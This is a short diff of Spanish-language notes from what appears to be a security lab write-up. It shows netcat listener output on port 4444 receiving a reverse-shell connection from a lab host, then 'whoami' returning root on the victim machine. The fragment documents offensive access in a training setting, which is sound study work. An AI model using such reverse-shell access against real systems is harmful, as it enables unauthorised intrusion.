@@ -21,4 +21,9 @@ esperare a que me responda, mientras en la sesion de root en la maquina victima 
 listening on [any] 4444 ...
 connect to [172.20.0.20] from maestro_defensa.labseguridad_red_ataque [172.20.0.10] 38306
 
-ya tengo conexion de la reverse shell
+ya tengo conexion de la reverse shell y estoy dentro
+
+whoami
+root
+
+ahora tengo sesion en el dispositivo pero tengo una terminal horrible
